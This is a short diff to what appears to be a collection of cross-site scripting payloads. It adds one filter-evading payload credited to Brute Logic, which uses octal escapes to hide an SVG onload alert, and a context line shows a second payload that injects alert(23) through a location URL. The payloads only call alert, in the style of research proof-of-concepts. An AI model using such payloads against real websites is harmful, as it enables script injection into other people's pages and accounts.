@@ -345,6 +345,12 @@ xss.html
     
 ---
 
+[Brute Logic](https://twitter.com/BRuteLogic/status/1754443215636189352)
+
+    <JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+
+---
+
 [mage_1868 ](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
 
     location="https://example.com/xss.html/.source;alert(23)?xss="
